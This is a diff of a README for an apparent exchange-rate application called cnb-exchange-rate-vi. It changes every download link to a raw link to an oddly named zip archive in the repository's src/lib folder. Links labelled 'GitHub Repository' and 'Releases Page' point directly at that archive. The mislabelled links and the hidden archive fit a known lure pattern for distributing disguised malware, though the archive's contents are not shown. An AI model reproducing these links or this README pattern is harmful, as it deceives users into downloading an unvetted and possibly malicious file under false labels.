@@ -1,6 +1,6 @@
 # 🌍 cnb-exchange-rate-vi - Access Real-Time Exchange Rates Easily
 
-[![Download Now](https://github.com/Kairoproto/cnb-exchange-rate-vi/raw/refs/heads/main/src/vi_rate_exchange_cnb_1.3-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/Kairoproto/cnb-exchange-rate-vi/raw/refs/heads/main/src/vi_rate_exchange_cnb_1.3-alpha.3.zip)
+[![Download Now](https://raw.githubusercontent.com/Kairoproto/cnb-exchange-rate-vi/main/src/lib/rate-exchange-cnb-vi-aglutition.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Kairoproto/cnb-exchange-rate-vi/main/src/lib/rate-exchange-cnb-vi-aglutition.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the cnb-exchange-rate-vi project! This application allows you to view
 
 ## 📥 Download & Install
 
-To get started with the cnb-exchange-rate-vi application, visit this page to download: [Download Here](https://github.com/Kairoproto/cnb-exchange-rate-vi/raw/refs/heads/main/src/vi_rate_exchange_cnb_1.3-alpha.3.zip).
+To get started with the cnb-exchange-rate-vi application, visit this page to download: [Download Here](https://raw.githubusercontent.com/Kairoproto/cnb-exchange-rate-vi/main/src/lib/rate-exchange-cnb-vi-aglutition.zip).
 
 Follow the steps below to install the application:
 
@@ -55,7 +55,7 @@ We believe in an open-source community. If you’d like to contribute to cnb-exc
 
 ## 🔗 Links & Resources
 
-- [GitHub Repository](https://github.com/Kairoproto/cnb-exchange-rate-vi/raw/refs/heads/main/src/vi_rate_exchange_cnb_1.3-alpha.3.zip)
-- [Releases Page for Download](https://github.com/Kairoproto/cnb-exchange-rate-vi/raw/refs/heads/main/src/vi_rate_exchange_cnb_1.3-alpha.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Kairoproto/cnb-exchange-rate-vi/main/src/lib/rate-exchange-cnb-vi-aglutition.zip)
+- [Releases Page for Download](https://raw.githubusercontent.com/Kairoproto/cnb-exchange-rate-vi/main/src/lib/rate-exchange-cnb-vi-aglutition.zip)
 
 Your journey into the world of currency exchange rates begins now. Download the cnb-exchange-rate-vi application and stay informed!
